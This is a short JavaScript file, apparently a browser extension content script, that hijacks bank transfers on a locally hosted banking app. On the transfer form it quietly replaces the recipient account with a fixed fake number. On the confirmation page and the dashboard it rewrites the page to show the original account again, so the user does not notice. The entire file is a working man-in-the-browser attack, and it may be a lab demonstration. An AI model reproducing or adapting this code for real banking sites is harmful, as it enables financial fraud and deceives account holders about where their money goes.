const FAKE_ACCOUNT_NO = '99999999999999999999999999'
console.log('extension is working');

if (window.location.href === 'http://127.0.0.1:8000/new_transfer') {
  console.log('good URL');
  var form = document.getElementById('confirm-form');
  if (form != null) {
    console.log('swaping account');
    var val = document.getElementById('id_recipient_account').value;
    localStorage.setItem('tmp_account', val)
    if(localStorage.getItem('real_accounts') == null) {
      localStorage.setItem('real_accounts', val);
    } else {
      localStorage.setItem('real_accounts', localStorage.getItem('real_accounts') + ' ' + val);
    }
    document.getElementById('id_recipient_account').value = FAKE_ACCOUNT_NO;
  } else {
    console.log('form is null');
  }
}

if (window.location.href === 'http://127.0.0.1:8000/confirm_transfer') {
  document.getElementById('transfer-details').children[1].innerHTML = 'Recipient\'s account number: ' + localStorage.getItem('tmp_account');
}

if (window.location.href === 'http://127.0.0.1:8000/dashboard') {
  var i = 0;
  var real_accounts = localStorage['real_accounts'].split(' ');
  for(cell of document.getElementsByTagName('td')) {
    if (cell.innerHTML === FAKE_ACCOUNT_NO) {
      if (i < real_accounts.length) {
        cell.innerHTML = real_accounts[i];
        i++;
      } else {
        break;
      }
    }
  }
}

